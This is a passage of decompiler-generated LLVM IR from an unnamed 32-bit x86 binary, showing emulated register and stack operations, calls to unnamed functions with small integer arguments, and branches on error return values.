  store i32 %v2_804e88c, i32* @esi, align 4
  %v1_804e88e = inttoptr i32 %v3_804e88b to i32*
  %v2_804e88e = load i32, i32* %v1_804e88e, align 4
  store i32 %v2_804e88e, i32* @ebx, align 4
  %v0_804e88f = load i32, i32* @edi, align 4
  store i32 %v0_804e88f, i32* %v1_804e88e, align 4
  %v0_804e890 = load i32, i32* @esi, align 4
  store i32 %v0_804e890, i32* %v1_804e88b, align 4
  %v3_804e891 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e891, i32* %eax.global-to-local, align 4
  store i32 %v3_804e891, i32* @ebx, align 4
  %v0_804e898 = load i32, i32* @esp, align 4
  %v1_804e898 = inttoptr i32 %v0_804e898 to i32*
  %v2_804e898 = load i32, i32* %v1_804e898, align 4
  store i32 %v2_804e898, i32* %eax.global-to-local, align 4
  %v3_804e898 = add i32 %v0_804e898, 4
  %v1_804e899 = inttoptr i32 %v3_804e898 to i32*
  store i32 0, i32* %v1_804e899, align 4
  store i32 7, i32* %v1_804e898, align 4
  %v3_804e89e = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e89e, i32* %eax.global-to-local, align 4
  %v0_804e8a3 = load i32, i32* @esp, align 4
  %v1_804e8a3 = inttoptr i32 %v0_804e8a3 to i32*
  %v3_804e8a3 = add i32 %v0_804e8a3, 4
  %v1_804e8a4 = inttoptr i32 %v3_804e8a3 to i32*
  store i32 %v3_804e89e, i32* %v1_804e8a4, align 4
  %v0_804e8a6 = load i32, i32* @esi, align 4
  %v1_804e8a6 = load i32, i32* @ebx, align 4
  %v2_804e8a6 = add i32 %v1_804e8a6, %v0_804e8a6
  store i32 %v2_804e8a6, i32* %eax.global-to-local, align 4
  store i32 %v2_804e8a6, i32* %v1_804e8a3, align 4
  %v3_804e8aa = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8aa, i32* %eax.global-to-local, align 4
  %v0_804e8af = load i32, i32* @esp, align 4
  %v1_804e8af = inttoptr i32 %v0_804e8af to i32*
  %v3_804e8af = add i32 %v0_804e8af, 4
  %v1_804e8b0 = inttoptr i32 %v3_804e8af to i32*
  %v2_804e8b0 = load i32, i32* %v1_804e8b0, align 4
  store i32 %v2_804e8b0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e8b0, align 4
  store i32 6, i32* %v1_804e8af, align 4
  %v3_804e8b5 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e8b5, i32* %eax.global-to-local, align 4
  %v0_804e8ba = load i32, i32* @esp, align 4
  %v1_804e8ba = inttoptr i32 %v0_804e8ba to i32*
  %v3_804e8ba = add i32 %v0_804e8ba, 4
  %v1_804e8bb = inttoptr i32 %v3_804e8ba to i32*
  %v2_804e8bb = load i32, i32* %v1_804e8bb, align 4
  store i32 %v2_804e8bb, i32* @ebx, align 4
  store i32 %v3_804e8b5, i32* %v1_804e8bb, align 4
  %v1_804e8bd = add i32 %v0_804e8ba, 8264
  store i32 %v1_804e8bd, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8bd, i32* %v1_804e8ba, align 4
  %v3_804e8c5 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8c5, i32* %eax.global-to-local, align 4
  %v0_804e8ca = load i32, i32* @esp, align 4
  %v1_804e8ca = add i32 %v3_804e8c5, 8264
  %v2_804e8d1 = add i32 %v1_804e8ca, %v0_804e8ca
  store i32 %v2_804e8d1, i32* @esi, align 4
  %v1_804e8d3 = inttoptr i32 %v0_804e8ca to i32*
  %v2_804e8d3 = load i32, i32* %v1_804e8d3, align 4
  store i32 %v2_804e8d3, i32* %eax.global-to-local, align 4
  %v3_804e8d3 = add i32 %v0_804e8ca, 4
  %v1_804e8d4 = inttoptr i32 %v3_804e8d3 to i32*
  %v0_804e8d5 = load i32, i32* @edi, align 4
  store i32 %v0_804e8d5, i32* %v1_804e8d4, align 4
  %v0_804e8d6 = load i32, i32* @esi, align 4
  store i32 %v0_804e8d6, i32* %v1_804e8d3, align 4
  %v3_804e8d7 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8d7, i32* %eax.global-to-local, align 4
  %v0_804e8dc = load i32, i32* @esp, align 4
  %v1_804e8dc = inttoptr i32 %v0_804e8dc to i32*
  %v3_804e8dc = add i32 %v0_804e8dc, 4
  %v1_804e8dd = inttoptr i32 %v3_804e8dc to i32*
  store i32 %v3_804e8d7, i32* @ebx, align 4
  store i32 0, i32* %v1_804e8dd, align 4
  store i32 11, i32* %v1_804e8dc, align 4
  %v3_804e8e4 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e8e4, i32* %eax.global-to-local, align 4
  %v0_804e8e9 = load i32, i32* @esp, align 4
  %v1_804e8e9 = inttoptr i32 %v0_804e8e9 to i32*
  %v3_804e8e9 = add i32 %v0_804e8e9, 4
  %v1_804e8ea = inttoptr i32 %v3_804e8e9 to i32*
  store i32 %v3_804e8e4, i32* %v1_804e8ea, align 4
  %v0_804e8ec = load i32, i32* @esi, align 4
  %v1_804e8ec = load i32, i32* @ebx, align 4
  %v2_804e8ec = add i32 %v1_804e8ec, %v0_804e8ec
  store i32 %v2_804e8ec, i32* %eax.global-to-local, align 4
  store i32 %v2_804e8ec, i32* %v1_804e8e9, align 4
  %v3_804e8f0 = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8f0, i32* %eax.global-to-local, align 4
  %v0_804e8f5 = load i32, i32* @esp, align 4
  %v1_804e8f5 = inttoptr i32 %v0_804e8f5 to i32*
  store i32 6, i32* %v1_804e8f5, align 4
  %v2_804e8fc = call i32 @function_8051c10(i8 0)
  store i32 %v2_804e8fc, i32* %eax.global-to-local, align 4
  %v0_804e901 = load i32, i32* @esp, align 4
  %v1_804e901 = inttoptr i32 %v0_804e901 to i32*
  store i32 7, i32* %v1_804e901, align 4
  %v2_804e908 = call i32 @function_8051c10(i8 0)
  %v0_804e90d = load i32, i32* @esp, align 4
  %v1_804e910 = add i32 %v0_804e90d, 8
  %v2_804e910 = inttoptr i32 %v1_804e910 to i32*
  store i32 4095, i32* %v2_804e910, align 4
  %v1_804e915 = add i32 %v0_804e90d, 4168
  store i32 %v1_804e915, i32* @edi, align 4
  %v2_804e91c = add i32 %v0_804e90d, 4
  %v3_804e91c = inttoptr i32 %v2_804e91c to i32*
  store i32 %v1_804e915, i32* %v3_804e91c, align 4
  %v1_804e91d = add i32 %v0_804e90d, 8328
  store i32 %v1_804e91d, i32* %eax.global-to-local, align 4
  %v3_804e924 = inttoptr i32 %v0_804e90d to i32*
  store i32 %v1_804e91d, i32* %v3_804e924, align 4
  %v4_804e925 = call i32 @function_8052d52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e925, i32* %eax.global-to-local, align 4
  %v0_804e92a = load i32, i32* @esp, align 4
  %v1_804e92a = add i32 %v0_804e92a, 16
  store i32 %v4_804e925, i32* @ebx, align 4
  %v10_804e92f = icmp eq i32 %v4_804e925, -1
  br i1 %v10_804e92f, label %dec_label_pc_804ea57, label %dec_label_pc_804e938

dec_label_pc_804e938:                             ; preds = %dec_label_pc_804e843
  %v2_804e938 = add i32 %v4_804e925, 4152
  %v3_804e938 = add i32 %v2_804e938, %v1_804e92a
  %v4_804e938 = inttoptr i32 %v3_804e938 to i8*
  store i8 0, i8* %v4_804e938, align 1
  %v0_804e940 = load i32, i32* @esp, align 4
  %v1_804e943 = add i32 %v0_804e940, -16
  %v2_804e943 = inttoptr i32 %v1_804e943 to i32*
  store i32 10, i32* %v2_804e943, align 4
  %v2_804e945 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804e945, i32* %eax.global-to-local, align 4
  %v0_804e94a = load i32, i32* @esp, align 4
  %v1_804e94a = inttoptr i32 %v0_804e94a to i32*
  %v3_804e94a = add i32 %v0_804e94a, 4
  %v1_804e94b = inttoptr i32 %v3_804e94a to i32*
  %v2_804e94b = load i32, i32* %v1_804e94b, align 4
  store i32 %v2_804e94b, i32* @esi, align 4
  store i32 0, i32* %v1_804e94b, align 4
  store i32 10, i32* %v1_804e94a, align 4
  %v3_804e950 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  %v0_804e955 = load i32, i32* @esp, align 4
  %v2_804e958 = add i32 %v0_804e955, 8
  %v3_804e958 = inttoptr i32 %v2_804e958 to i32*
  store i32 %v3_804e950, i32* %v3_804e958, align 4
  %v0_804e959 = load i32, i32* @ebx, align 4
  %v1_804e959 = add i32 %v0_804e959, -1
  store i32 %v1_804e959, i32* %eax.global-to-local, align 4
  %v2_804e95c = add i32 %v0_804e955, 4
  %v3_804e95c = inttoptr i32 %v2_804e95c to i32*
  store i32 %v1_804e959, i32* %v3_804e95c, align 4
  %v1_804e95d = add i32 %v0_804e955, 4168
  store i32 %v1_804e95d, i32* @edi, align 4
  %v3_804e964 = inttoptr i32 %v0_804e955 to i32*
  store i32 %v1_804e95d, i32* %v3_804e964, align 4
  %v4_804e965 = call i32 @function_80528d0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e96a = load i32, i32* @esp, align 4
  %v1_804e96d = add i32 %v4_804e965, 1
  %v8_804e96d = icmp eq i32 %v1_804e96d, 0
  store i32 %v1_804e96d, i32* %eax.global-to-local, align 4
  br i1 %v8_804e96d, label %dec_label_pc_804e98d, label %dec_label_pc_804e970

dec_label_pc_804e970:                             ; preds = %dec_label_pc_804e938
  %v1_804e973 = add i32 %v0_804e96a, 4168
  store i32 %v1_804e973, i32* %eax.global-to-local, align 4
  %v3_804e97a = inttoptr i32 %v0_804e96a to i32*
  store i32 %v1_804e973, i32* %v3_804e97a, align 4
  %v0_804e97b = call i32 @function_8052e70()
  store i32 %v0_804e97b, i32* %eax.global-to-local, align 4
  %v0_804e980 = load i32, i32* @esp, align 4
  %v1_804e980 = inttoptr i32 %v0_804e980 to i32*
  %v2_804e980 = load i32, i32* %v1_804e980, align 4
  store i32 %v2_804e980, i32* %eax.global-to-local, align 4
  %v3_804e980 = add i32 %v0_804e980, 4
  %v1_804e981 = inttoptr i32 %v3_804e980 to i32*
  store i32 9, i32* %v1_804e981, align 4
  %v0_804e984 = load i32, i32* @ebp, align 4
  store i32 %v0_804e984, i32* %v1_804e980, align 4
  %v4_804e985 = call i32 @function_8052c60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e985, i32* %eax.global-to-local, align 4
  %v0_804e98a = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e98d

dec_label_pc_804e98d:                             ; preds = %dec_label_pc_804e938, %dec_label_pc_804e970
  %v0_804e98d.in = phi i32 [ %v0_804e96a, %dec_label_pc_804e938 ], [ %v0_804e98a, %dec_label_pc_804e970 ]
  %v2_804e990 = inttoptr i32 %v0_804e98d.in to i32*
  store i32 10, i32* %v2_804e990, align 4
  %v2_804e992 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804e992, i32* %eax.global-to-local, align 4
  %v0_804e997 = call i32 @function_8052bd5()
  store i32 %v0_804e997, i32* %eax.global-to-local, align 4
  %v0_804e99c = load i32, i32* @esp, align 4
  %v1_804e99c = add i32 %v0_804e99c, 16
  %v0_804e99f = load i32, i32* @ebp, align 4
  %v12_804e99f = icmp eq i32 %v0_804e99f, %v0_804e997
  br i1 %v12_804e99f, label %dec_label_pc_804e9c8, label %dec_label_pc_804e9a3

dec_label_pc_804e9a3:                             ; preds = %dec_label_pc_804e98d
  %v0_804e9a3 = call i32 @function_8052bfb()
  store i32 %v0_804e9a3, i32* %eax.global-to-local, align 4
  %v0_804e9a8 = load i32, i32* @ebp, align 4
  %v12_804e9a8 = icmp eq i32 %v0_804e9a8, %v0_804e9a3
  %v0_804e9ca.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e9a8, label %dec_label_pc_804e9c8, label %dec_label_pc_804e9ac

dec_label_pc_804e9ac:                             ; preds = %dec_label_pc_804e9a3
  %v2_804e9ac = add i32 %v0_804e9ca.pre, -4
  %v3_804e9ac = inttoptr i32 %v2_804e9ac to i32*
  store i32 %v0_804e9a3, i32* %v3_804e9ac, align 4
  %v2_804e9ad = add i32 %v0_804e9ca.pre, -8
  %v3_804e9ad = inttoptr i32 %v2_804e9ad to i32*
  store i32 %v0_804e9a3, i32* %v3_804e9ad, align 4
  %v0_804e9ae = load i32, i32* @global_var_80572e0.22, align 32
  store i32 %v0_804e9ae, i32* %eax.global-to-local, align 4
  %v2_804e9b3 = add i32 %v0_804e9ca.pre, -12
  %v3_804e9b3 = inttoptr i32 %v2_804e9b3 to i32*
  store i32 %v0_804e9ae, i32* %v3_804e9b3, align 4
  %v1_804e9b4 = add i32 %v0_804e9ca.pre, 4152
  store i32 %v1_804e9b4, i32* @edi, align 4
  %v2_804e9bb = add i32 %v0_804e9ca.pre, -16
  %v3_804e9bb = inttoptr i32 %v2_804e9bb to i32*
  store i32 %v1_804e9b4, i32* %v3_804e9bb, align 4
  %v0_804e9bc = call i32 @function_8052950()
  store i32 %v0_804e9bc, i32* %eax.global-to-local, align 4
  %v0_804e9c1 = load i32, i32* @esp, align 4
  %v3_804e9c4 = trunc i32 %v0_804e9bc to i8
  %v4_804e9c4 = icmp eq i8 %v3_804e9c4, 0
  br i1 %v4_804e9c4, label %dec_label_pc_804ea23, label %dec_label_pc_804e9ac.dec_label_pc_804e9c8_crit_edge

dec_label_pc_804e9ac.dec_label_pc_804e9c8_crit_edge: ; preds = %dec_label_pc_804e9ac
  %v1_804e9c1 = add i32 %v0_804e9c1, 16
  %v0_804e9c8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e9c8

dec_label_pc_804e9c8:                             ; preds = %dec_label_pc_804e9a3, %dec_label_pc_804e9ac.dec_label_pc_804e9c8_crit_edge, %dec_label_pc_804e98d
  %v0_804e9ca = phi i32 [ %v1_804e9c1, %dec_label_pc_804e9ac.dec_label_pc_804e9c8_crit_edge ], [ %v1_804e99c, %dec_label_pc_804e98d ], [ %v0_804e9ca.pre, %dec_label_pc_804e9a3 ]
  %v0_804e9c8 = phi i32 [ %v0_804e9c8.pre, %dec_label_pc_804e9ac.dec_label_pc_804e9c8_crit_edge ], [ %v0_804e997, %dec_label_pc_804e98d ], [ %v0_804e9a3, %dec_label_pc_804e9a3 ]
  store i32 %v0_804e9c8, i32* @esi, align 4
  %v1_804e9ca = add i32 %v0_804e9ca, 8
  %v2_804e9ca = inttoptr i32 %v1_804e9ca to i32*
  %v3_804e9ca = load i32, i32* %v2_804e9ca, align 4
  store i32 %v3_804e9ca, i32* @ebx, align 4
  br label %dec_label_pc_804e7e0

dec_label_pc_804e9d3:                             ; preds = %dec_label_pc_804e7e0
  %v1_804e9d6 = add i32 %v0_804e7ed, 32
  %v2_804e9d6 = inttoptr i32 %v1_804e9d6 to i32*
  %v3_804e9d6 = load i32, i32* %v2_804e9d6, align 4
  store i32 %v3_804e9d6, i32* @eax, align 4
  %v3_804e9da = inttoptr i32 %v0_804e7ed to i32*
  store i32 %v3_804e9d6, i32* %v3_804e9da, align 4
  %v0_804e9db = call i32 @function_8052ed4()
  store i32 %v0_804e9db, i32* %eax.global-to-local, align 4
  %v0_804e9e0 = load i32, i32* @esp, align 4
  %v1_804e9e0 = add i32 %v0_804e9e0, 16
  br label %dec_label_pc_804e7a0

dec_label_pc_804e9e8:                             ; preds = %dec_label_pc_804e822
  %v0_804e9e8 = load i32, i32* @ebp, align 4
  %v7_804e9ee = icmp sgt i32 %v0_804e9e8, 400
  br i1 %v7_804e9ee, label %dec_label_pc_804e9f4, label %dec_label_pc_804e7e0

dec_label_pc_804e9f4:                             ; preds = %dec_label_pc_804e9e8
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e9f9 = add i32 %v0_804e82e, 28
  %v2_804e9f9 = inttoptr i32 %v1_804e9f9 to i32*
  %v3_804e9f9 = load i32, i32* %v2_804e9f9, align 4
  %v10_804e9f9 = udiv i32 %v3_804e9f9, 2
  store i32 %v10_804e9f9, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804ea07 = load i32, i32* %v2_804e9f9, align 4
  %v15_804ea07 = icmp eq i32 %v3_804ea07, 0
  %v1_804ea0b = icmp eq i1 %v15_804ea07, false
  br i1 %v1_804ea0b, label %dec_label_pc_804e7e0, label %dec_label_pc_804ea11

dec_label_pc_804ea11:                             ; preds = %dec_label_pc_804e9f4
  %v2_804ea14 = inttoptr i32 %v0_804e82e to i32*
  store i32 1, i32* %v2_804ea14, align 4
  %v1_804ea16 = call i32 @function_8054730(i32 0)
  store i32 %v1_804ea16, i32* %eax.global-to-local, align 4
  %v0_804ea1b = load i32, i32* @esp, align 4
  %v1_804ea1b = add i32 %v0_804ea1b, 16
  br label %dec_label_pc_804e7e0

dec_label_pc_804ea23:                             ; preds = %dec_label_pc_804e9ac
  %v2_804ea23 = add i32 %v0_804e9c1, 12
  %v3_804ea23 = inttoptr i32 %v2_804ea23 to i32*
  store i32 %v0_804e9bc, i32* %v3_804ea23, align 4
  %v2_804ea24 = add i32 %v0_804e9c1, 8
  %v3_804ea24 = inttoptr i32 %v2_804ea24 to i32*
  store i32 %v0_804e9bc, i32* %v3_804ea24, align 4
  %v1_804ea25 = add i32 %v0_804e9c1, 4
  %v2_804ea25 = inttoptr i32 %v1_804ea25 to i32*
  store i32 0, i32* %v2_804ea25, align 4
  %v1_804ea27 = add i32 %v0_804e9c1, 4168
  store i32 %v1_804ea27, i32* %eax.global-to-local, align 4
  %v3_804ea2e = inttoptr i32 %v0_804e9c1 to i32*
  store i32 %v1_804ea27, i32* %v3_804ea2e, align 4
  %v3_804ea2f = call i32 @function_8052c92(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ea2f, i32* %eax.global-to-local, align 4
  %v0_804ea34 = load i32, i32* @esp, align 4
  store i32 %v3_804ea2f, i32* @ebx, align 4
  %v10_804ea39 = icmp eq i32 %v3_804ea2f, -1
  %v1_804ea3c = icmp eq i1 %v10_804ea39, false
  br i1 %v1_804ea3c, label %dec_label_pc_804ea4b, label %dec_label_pc_804ea3e

dec_label_pc_804ea3e:                             ; preds = %dec_label_pc_804ea23
  %v0_804ea3e = load i32, i32* @edi, align 4
  %v2_804ea3e = add i32 %v0_804ea34, 12
  %v3_804ea3e = inttoptr i32 %v2_804ea3e to i32*
  store i32 %v0_804ea3e, i32* %v3_804ea3e, align 4
  %v0_804ea3f = load i32, i32* @edi, align 4
  %v2_804ea3f = add i32 %v0_804ea34, 8
  %v3_804ea3f = inttoptr i32 %v2_804ea3f to i32*
  store i32 %v0_804ea3f, i32* %v3_804ea3f, align 4
  %v1_804ea40 = add i32 %v0_804ea34, 4
  %v2_804ea40 = inttoptr i32 %v1_804ea40 to i32*
  store i32 9, i32* %v2_804ea40, align 4
  %v0_804ea42 = load i32, i32* @ebp, align 4
  %v3_804ea42 = inttoptr i32 %v0_804ea34 to i32*
  store i32 %v0_804ea42, i32* %v3_804ea42, align 4
  %v4_804ea43 = call i32 @function_8052c60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ea43, i32* %eax.global-to-local, align 4
  %v0_804ea48 = load i32, i32* @esp, align 4
  %v0_804ea4e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea4b

dec_label_pc_804ea4b:                             ; preds = %dec_label_pc_804ea23, %dec_label_pc_804ea3e
  %v0_804ea4e = phi i32 [ %v3_804ea2f, %dec_label_pc_804ea23 ], [ %v0_804ea4e.pre, %dec_label_pc_804ea3e ]
  %v0_804ea4b.in = phi i32 [ %v0_804ea34, %dec_label_pc_804ea23 ], [ %v0_804ea48, %dec_label_pc_804ea3e ]
  %v3_804ea4e = inttoptr i32 %v0_804ea4b.in to i32*
  store i32 %v0_804ea4e, i32* %v3_804ea4e, align 4
  %v1_804ea4f = call i32 @function_8052b81(i32 0)
  store i32 %v1_804ea4f, i32* %eax.global-to-local, align 4
  %v0_804ea54 = load i32, i32* @esp, align 4
  %v1_804ea54 = add i32 %v0_804ea54, 16
  br label %dec_label_pc_804ea57

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804e843, %dec_label_pc_804ea4b
  %v1_804ea57 = phi i32 [ %v1_804e92a, %dec_label_pc_804e843 ], [ %v1_804ea54, %dec_label_pc_804ea4b ]
  %v0_804ea57 = load i32, i32* @esi, align 4
  %v2_804ea57 = add i32 %v1_804ea57, -4
  %v3_804ea57 = inttoptr i32 %v2_804ea57 to i32*
  store i32 %v0_804ea57, i32* %v3_804ea57, align 4
  %v0_804ea58 = load i32, i32* @esi, align 4
  %v2_804ea58 = add i32 %v1_804ea57, -8
  %v3_804ea58 = inttoptr i32 %v2_804ea58 to i32*
  store i32 %v0_804ea58, i32* %v3_804ea58, align 4
  %v1_804ea59 = add i32 %v1_804ea57, -12
  %v2_804ea59 = inttoptr i32 %v1_804ea59 to i32*
  store i32 0, i32* %v2_804ea59, align 4
  %v1_804ea5b = add i32 %v1_804ea57, 8312
  %v2_804ea62 = add i32 %v1_804ea57, -16
  %v3_804ea62 = inttoptr i32 %v2_804ea62 to i32*
  store i32 %v1_804ea5b, i32* %v3_804ea62, align 4
  %v3_804ea63 = call i32 @function_8052c92(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804ea68 = load i32, i32* @esp, align 4
  %v2_804ea68 = add i32 %v1_804ea68, 56
  %v3_804ea68 = inttoptr i32 %v2_804ea68 to i32*
  store i32 %v3_804ea63, i32* %v3_804ea68, align 4
  %v0_804ea6c = load i32, i32* @esp, align 4
  %v1_804ea6f = add i32 %v3_804ea63, 1
  %v8_804ea6f = icmp eq i32 %v1_804ea6f, 0
  store i32 %v1_804ea6f, i32* @eax, align 4
  br i1 %v8_804ea6f, label %dec_label_pc_804ecac, label %dec_label_pc_804ea76

dec_label_pc_804ea76:                             ; preds = %dec_label_pc_804ea57
  %v2_804ea79 = inttoptr i32 %v0_804ea6c to i32*
  store i32 12, i32* %v2_804ea79, align 4
  %v2_804ea7b = call i32 @function_8051c90(i8 0)
  store i32 %v2_804ea7b, i32* %eax.global-to-local, align 4
  %v0_804ea80 = load i32, i32* @esp, align 4
  %v1_804ea80 = inttoptr i32 %v0_804ea80 to i32*
  store i32 13, i32* %v1_804ea80, align 4
  %v2_804ea87 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804ea87, i32* %eax.global-to-local, align 4
  %v0_804ea8c = load i32, i32* @esp, align 4
  %v1_804ea8c = inttoptr i32 %v0_804ea8c to i32*
  store i32 14, i32* %v1_804ea8c, align 4
  %v2_804ea93 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804ea93, i32* %eax.global-to-local, align 4
  %v0_804ea98 = load i32, i32* @esp, align 4
  %v1_804ea98 = inttoptr i32 %v0_804ea98 to i32*
  store i32 15, i32* %v1_804ea98, align 4
  %v2_804ea9f = call i32 @function_8051c90(i8 0)
  store i32 %v2_804ea9f, i32* %eax.global-to-local, align 4
  %v0_804eaa4 = load i32, i32* @esp, align 4
  %v1_804eaa4 = inttoptr i32 %v0_804eaa4 to i32*
  store i32 16, i32* %v1_804eaa4, align 4
  %v2_804eaab = call i32 @function_8051c90(i8 0)
  store i32 %v2_804eaab, i32* %eax.global-to-local, align 4
  %v0_804eab0 = load i32, i32* @esp, align 4
  %v1_804eab0 = inttoptr i32 %v0_804eab0 to i32*
  %v3_804eab0 = add i32 %v0_804eab0, 4
  %v1_804eab1 = inttoptr i32 %v3_804eab0 to i32*
  %v1_804eab2 = add i32 %v0_804eab0, 8436
  store i32 %v1_804eab2, i32* %eax.global-to-local, align 4
  store i32 %v1_804eab2, i32* %v1_804eab1, align 4
  store i32 12, i32* %v1_804eab0, align 4
  %v3_804eabc = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804eabc, i32* %eax.global-to-local, align 4
  %v1_804eac1 = load i32, i32* @esp, align 4
  %v2_804eac1 = add i32 %v1_804eac1, 52
  %v3_804eac1 = inttoptr i32 %v2_804eac1 to i32*
  store i32 %v3_804eabc, i32* %v3_804eac1, align 4
  %v0_804eac5 = load i32, i32* @esp, align 4
  %v1_804eac5 = inttoptr i32 %v0_804eac5 to i32*
  %v3_804eac5 = add i32 %v0_804eac5, 4
  %v1_804eac6 = inttoptr i32 %v3_804eac5 to i32*
  %v1_804eac7 = add i32 %v0_804eac5, 8432
  store i32 %v1_804eac7, i32* %eax.global-to-local, align 4
  store i32 %v1_804eac7, i32* %v1_804eac6, align 4
  store i32 13, i32* %v1_804eac5, align 4
  %v3_804ead1 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804ead1, i32* %eax.global-to-local, align 4
  %v1_804ead6 = load i32, i32* @esp, align 4
  %v2_804ead6 = add i32 %v1_804ead6, 48
  %v3_804ead6 = inttoptr i32 %v2_804ead6 to i32*
  store i32 %v3_804ead1, i32* %v3_804ead6, align 4
  %v0_804eada = load i32, i32* @esp, align 4
  %v1_804eada = inttoptr i32 %v0_804eada to i32*
  %v3_804eada = add i32 %v0_804eada, 4
  %v1_804eadb = inttoptr i32 %v3_804eada to i32*
  %v2_804eadb = load i32, i32* %v1_804eadb, align 4
  store i32 %v2_804eadb, i32* @edi, align 4
  %v1_804eadc = add i32 %v0_804eada, 8428
  store i32 %v1_804eadc, i32* %eax.global-to-local, align 4
  store i32 %v1_804eadc, i32* %v1_804eadb, align 4
  store i32 14, i32* %v1_804eada, align 4
  %v3_804eae6 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804eae6, i32* %eax.global-to-local, align 4
  %v1_804eaeb = load i32, i32* @esp, align 4
  %v2_804eaeb = add i32 %v1_804eaeb, 44
  %v3_804eaeb = inttoptr i32 %v2_804eaeb to i32*
  store i32 %v3_804eae6, i32* %v3_804eaeb, align 4
  %v0_804eaef = load i32, i32* @esp, align 4
  %v1_804eaef = inttoptr i32 %v0_804eaef to i32*
  %v3_804eaef = add i32 %v0_804eaef, 4
  %v1_804eaf0 = inttoptr i32 %v3_804eaef to i32*
  %v2_804eaf0 = load i32, i32* %v1_804eaf0, align 4
  store i32 %v2_804eaf0, i32* @ebx, align 4
  %v1_804eaf1 = add i32 %v0_804eaef, 8440
  store i32 %v1_804eaf1, i32* %eax.global-to-local, align 4
  store i32 %v1_804eaf1, i32* %v1_804eaf0, align 4
  store i32 15, i32* %v1_804eaef, align 4
  %v3_804eafb = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804eafb, i32* %eax.global-to-local, align 4
  %v1_804eb00 = load i32, i32* @esp, align 4
  %v2_804eb00 = add i32 %v1_804eb00, 40
  %v3_804eb00 = inttoptr i32 %v2_804eb00 to i32*
  store i32 %v3_804eafb, i32* %v3_804eb00, align 4
  %v0_804eb04 = load i32, i32* @esp, align 4
  %v1_804eb04 = inttoptr i32 %v0_804eb04 to i32*
  %v3_804eb04 = add i32 %v0_804eb04, 4
  %v1_804eb05 = inttoptr i32 %v3_804eb04 to i32*
  %v1_804eb06 = add i32 %v0_804eb04, 8424
  store i32 %v1_804eb06, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb06, i32* %v1_804eb05, align 4
  store i32 16, i32* %v1_804eb04, align 4
  %v3_804eb10 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804eb10, i32* %eax.global-to-local, align 4
  %v1_804eb15 = load i32, i32* @esp, align 4
  %v2_804eb15 = add i32 %v1_804eb15, 36
  %v3_804eb15 = inttoptr i32 %v2_804eb15 to i32*
  store i32 %v3_804eb10, i32* %v3_804eb15, align 4
  %v0_804eb19 = load i32, i32* @esp, align 4
  %v1_804eb19 = add i32 %v0_804eb19, 16
  %v0_804eb1c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb1c

dec_label_pc_804eb1c:                             ; preds = %dec_label_pc_804ec18, %dec_label_pc_804ec30.backedge, %dec_label_pc_804ec27, %dec_label_pc_804ea76
  %v1_804eb1c = phi i32 [ %v1_804eb19, %dec_label_pc_804ea76 ], [ %v0_804ec27, %dec_label_pc_804ec27 ], [ %v0_804ec27, %dec_label_pc_804ec30.backedge ], [ %v0_804ec27, %dec_label_pc_804ec18 ]
  %v0_804eb1c = phi i32 [ %v0_804eb1c.pre, %dec_label_pc_804ea76 ], [ %v0_804eb1c52, %dec_label_pc_804ec27 ], [ %v6_804ec3e, %dec_label_pc_804ec30.backedge ], [ %v0_804eb1c52, %dec_label_pc_804ec18 ]
  %v2_804eb1c = add i32 %v1_804eb1c, -4
  %v3_804eb1c = inttoptr i32 %v2_804eb1c to i32*
  store i32 %v0_804eb1c, i32* %v3_804eb1c, align 4
  %v1_804eb1d = add i32 %v1_804eb1c, -8
  %v2_804eb1d = inttoptr i32 %v1_804eb1d to i32*
  store i32 4096, i32* %v2_804eb1d, align 4
  %v1_804eb22 = add i32 %v1_804eb1c, 56
  store i32 %v1_804eb22, i32* %eax.global-to-local, align 4
  %v2_804eb26 = add i32 %v1_804eb1c, -12
  %v3_804eb26 = inttoptr i32 %v2_804eb26 to i32*
  store i32 %v1_804eb22, i32* %v3_804eb26, align 4
  %v1_804eb27 = add i32 %v1_804eb1c, 40
  %v2_804eb27 = inttoptr i32 %v1_804eb27 to i32*
  %v3_804eb27 = load i32, i32* %v2_804eb27, align 4
  store i32 %v3_804eb27, i32* %eax.global-to-local, align 4
